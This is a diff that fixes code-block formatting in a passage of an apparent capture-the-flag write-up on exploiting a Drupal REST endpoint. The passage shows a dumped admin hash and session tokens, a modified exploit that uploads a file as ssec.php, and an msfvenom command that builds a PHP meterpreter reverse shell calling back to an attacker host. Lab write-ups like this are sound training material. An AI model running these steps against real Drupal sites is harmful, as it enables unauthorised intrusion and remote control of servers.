@@ -148,7 +148,7 @@ So we can set the endpoint_path variable to $endpoint_path = `‘/rest’;`once 
 - user.json
 - session.json
 
-`user.json
+```user.json
 {
  “uid”: “1”,
  “name”: “admin”,
@@ -184,19 +184,19 @@ So we can set the endpoint_path variable to $endpoint_path = `‘/rest’;`once 
  }
  },
  “pass”: “$S$DRYKUR0xDeqClnV5W0dnncafeE.Wi4YytNcBmmCtwOjrcH5FJSaE”
-}``
+}```
 
-``session.json
-
+session.json
+```
 {
  “session_name”: “SESSd873f26fc11f2b7e6e4aa0f6fce59913”,
  “session_id”: “xAmjIUH0wKeDr1QmfFsRWOs6QO_I-NpOEOkd-i3fVkU”,
  “token”: “s4iFtBwozCOf0rxIeloGaQ_KfOY1rGFOUpxNc2z5BH8”
 }
-`
+```
 I modified the exploit so it would read from a file and that file contained my php reverse shell.
 
-`$myfile = fopen(“payload1.txt”, “r”) or die(“Unable to open file!”);
+```$myfile = fopen(“payload1.txt”, “r”) or die(“Unable to open file!”);
 $payload1 = fread($myfile,filesize(“payload1.txt”));
 $url = ‘10.10.10.9’;
 $endpoint_path = ‘/rest’;
@@ -204,9 +204,8 @@ $endpoint = ‘rest_endpoint’;
 
  $file = [
  ‘filename’ => ‘ssec.php’,
- ‘data’ => $payload1
-];``
-`
+ ‘data’ => $payload1];
+```
 I created a payload named payload1.txt and the contents of payload1.txt will be uploaded to the webserver as ssec.php
 msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.x.x LPORT=1234 -f raw > payload1.txt
 now when I run the drupal exploit the payload is written to the web server as a php shell and we can connect to the victims system.
